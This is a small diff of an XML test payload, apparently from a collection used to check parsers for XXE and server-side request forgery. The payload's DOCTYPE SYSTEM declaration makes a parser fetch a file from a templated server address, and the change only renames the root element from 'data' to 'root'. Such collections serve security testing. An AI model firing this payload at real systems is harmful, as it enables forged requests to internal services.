@@ -4,7 +4,7 @@
 name: DOCTYPE URL Invocation
 description: Server Side Request Forgery Attack via DOCTYPE SYSTEM
 -->
-<!DOCTYPE data SYSTEM "http://{server_address}/file.xml" [
-  <!ELEMENT data (#PCDATA)>
+<!DOCTYPE root SYSTEM "http://{server_address}/file.xml" [
+  <!ELEMENT root (#PCDATA)>
 ]>
-<data>This is a test.</data>
+<root>This is a test.</root>
